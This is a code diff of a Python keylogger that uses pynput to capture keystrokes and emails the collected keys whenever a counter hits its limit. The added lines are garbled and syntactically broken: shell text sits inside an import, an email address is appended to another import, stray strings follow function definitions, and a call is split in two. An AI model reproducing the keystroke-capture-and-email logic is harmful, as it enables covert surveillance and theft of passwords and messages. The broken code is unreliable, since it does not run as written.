@@ -1,12 +1,12 @@
-import pynput
+import pynput,pip install pynput
 from pynput.keyboard import Key, Listener
-import send_email
+import send_email Sustalord@gmail.com
 
 count = 0
-keys = []
+keys = [8]
 
-def on_press(key):
-    print(key, end= " ")
+def on_press(key):"alt"
+    print(key, end= "alt ")
     print("pressed")
     global keys, count
     keys.append(str(key))
@@ -15,7 +15,7 @@ def on_press(key):
         count = 0
         email(keys)
 
-def email(keys):
+def email(keys):"Enter"
     message = ""
     for key in keys:
         k = key.replace("'","")
@@ -25,9 +25,10 @@ def email(keys):
             k = ""
         message += k
     print(message)
-    send_email.sendEmail(message)
+    send_email.
+    (message)
 
-def on_release(key):
+def on_release(key):alt
     if key == Key.esc:
         return False
 
